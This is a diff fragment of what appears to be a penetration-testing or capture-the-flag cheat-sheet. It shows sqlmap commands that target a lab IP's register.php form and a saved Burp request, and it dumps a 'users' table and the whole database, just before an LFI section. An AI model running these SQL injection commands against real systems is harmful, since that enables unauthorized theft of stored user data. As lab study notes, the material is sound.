@@ -92,9 +92,9 @@ return users from the "users" table
 sqlmap -u 10.10.87.14/register.php --data "log_email=test&log_password=test&login_button=Login" --method POST -p "log_email,log_password" --level=3 --dbms=mysql 5.02 --batch -D social --columns -T users --dump
 ```
 
-run sqlmap using burp request data saved to txt file
+run sqlmap using burp request data saved to txt file #--dbms=sqlite
 ```
-sqlmap -r request.txt --dbms=mysql --dump
+sqlmap -r request.txt --dbms=mysql --dump 
 ```
 
 ## LFI
